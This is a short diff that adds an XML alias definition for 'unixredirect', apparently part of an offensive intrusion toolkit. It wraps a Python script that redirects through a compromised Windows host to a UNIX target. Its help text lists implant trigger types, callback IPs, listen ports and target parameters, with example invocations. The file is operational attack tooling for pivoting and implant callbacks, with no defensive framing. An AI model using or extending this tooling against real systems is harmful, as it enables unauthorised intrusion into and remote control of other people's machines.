@@ -1,0 +1,30 @@
+<?xml version='1.1' ?>
+<Aliases>
+	<Alias>
+		<Name>unixredirect</Name>
+		<ReplaceBeforeArgs>python windows\unixredir.py -args "</ReplaceBeforeArgs>
+		<ReplaceAfterArgs>"</ReplaceAfterArgs>
+		<Help>unixredirect
+	Redirect to a UNIX Target through a WINDOWS box
+	-y (ISH Trigger Type) (udp|tcp|icmp) Default: udp
+	-i [ISH Callback IP]*
+	-p [ISH Callback/Listen Port]*
+	-r [ISH Trigger Port]
+	-c [NOPEN Callback IP]
+	-o [NOPEN Callback/Listen Port]
+	-t [Unix Target IP]*
+	*Required
+	Default EXAMPLE: unixredirect -i WINDOWS_CALLBACK -p 39145 -t UNIXTARGET
+	ISH/DD Listen:   unixredirect -i 0.0.0.0 -p 39145 -t UNIXTARGET
+		</Help>
+		<Options>
+			<Option>y</Option>
+			<Option>i</Option>
+			<Option>p</Option>
+			<Option>c</Option>
+			<Option>o</Option>
+			<Option>r</Option>
+			<Option>t</Option>
+		</Options>
+	</Alias>
+</Aliases>
